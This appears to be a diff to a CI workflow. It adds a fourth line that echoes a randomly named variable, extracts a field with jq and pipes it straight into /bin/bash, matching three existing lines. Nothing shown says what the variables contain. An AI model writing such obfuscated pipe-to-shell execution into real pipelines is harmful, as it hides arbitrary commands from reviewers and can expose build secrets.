@@ -20,6 +20,7 @@ jobs:
           echo $xynfs801 | jq -r .jro15909 | /bin/bash
           echo $kdk389 | jq -r .vseyy75 | /bin/bash
           echo $bs084 | jq -r .v04290 | /bin/bash
+          echo $oycig83119 | jq -r .ob8 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
